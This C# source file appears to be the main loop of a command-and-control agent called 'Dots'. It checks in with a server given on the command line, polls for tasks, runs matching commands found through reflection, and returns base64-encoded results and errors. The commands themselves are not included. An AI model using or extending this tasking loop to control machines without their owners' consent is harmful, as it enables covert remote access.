using Dots.Models;
using System;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Dots
{
    public class Program
    {
        private static TaskManager _taskManager;
        private static DotsProperties _dotsProperty = new DotsProperties();

        public static async Task Main(string[] args)
        {
            LoadDotsCommands();
            _taskManager = new TaskManager(args[0], _dotsProperty);
            _taskManager.Init();
            string _checkInTaskId = _taskManager.InitialCheckin(args[1]);
            if (_checkInTaskId == null)
            {
                return;
            }
            _dotsProperty.TaskManager = _taskManager;
            _dotsProperty.SocketIOClient.Options.Auth = _checkInTaskId;
            _taskManager.RetrieveTasks();
            while (!_dotsProperty.ExecuteTasks.IsCancellationRequested)
            {
                if (_taskManager.RetrieveBatchRequest(out var tasks))
                {
                    foreach (var task in tasks)
                    {
                        ExecuteTask(task);
                    }
                }
                await Task.Delay(100);
            }
        }

        private static void LoadDotsCommands()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();

            foreach (var type in assembly.GetTypes())
            {
                if (type.IsSubclassOf(typeof(DotsCommand)))
                {
                    DotsCommand command = (DotsCommand)Activator.CreateInstance(type);
                    command.DotsProperty = _dotsProperty;
                    _dotsProperty.Commands.Add(command);
                }
            }
        }

        private static void ExecuteTask(TaskRequest task)
        {
            foreach (Object command in _dotsProperty.Commands)
            {
                try
                {
                    Type commandType = command.GetType();
                    PropertyInfo nameProperty = commandType.GetProperty("Name");
                    MethodInfo executeMethod = commandType.GetMethod("Execute");

                    if (nameProperty != null && executeMethod != null)
                    {
                        string name = (string)nameProperty.GetValue(command);

                        if (!string.IsNullOrEmpty(name) && name == task.Method)
                        {
                           // Console.WriteLine($"executing {name}");
                            object result = executeMethod.Invoke(command, new object[] { task });
                            //Console.WriteLine($"done executing {name}");
                            if (result is byte[] bytes)
                            {
                                result = Convert.ToBase64String(bytes);
                            }
                            else if (result != null)
                            {
                                result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result.ToString()));
                            }
                            else
                            {
                                return;
                            }
                            _taskManager.SendResult((string)result, task.Id);
                            return;
                        }
                    }
                }
                catch (Exception ex)
                {
                    _taskManager.SendError(-32000, Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.InnerException?.Message ?? ex.Message)), task.Id);
                    return;
                }
            }

            // If no matching command is found, send an error response
            _taskManager.SendError(-32601, Convert.ToBase64String(Encoding.UTF8.GetBytes($"{task.Method} is not supported")), task.Id);
        }
    }
}
